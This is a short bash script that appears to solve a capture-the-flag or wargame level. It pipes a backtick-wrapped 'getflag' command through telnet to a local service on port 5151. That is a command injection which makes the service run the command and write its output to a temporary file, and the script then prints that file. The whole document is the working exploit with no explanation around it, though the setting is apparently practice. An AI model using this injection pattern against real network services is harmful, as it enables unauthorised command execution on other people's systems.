#!/bin/bash
GETFLAG_OUPUT="/tmp/getflag_output"

set -x

# Exploit echo command inside script while injecting getflag command
echo "\`getflag > $GETFLAG_OUPUT\`" | telnet localhost 5151

cat $GETFLAG_OUPUT
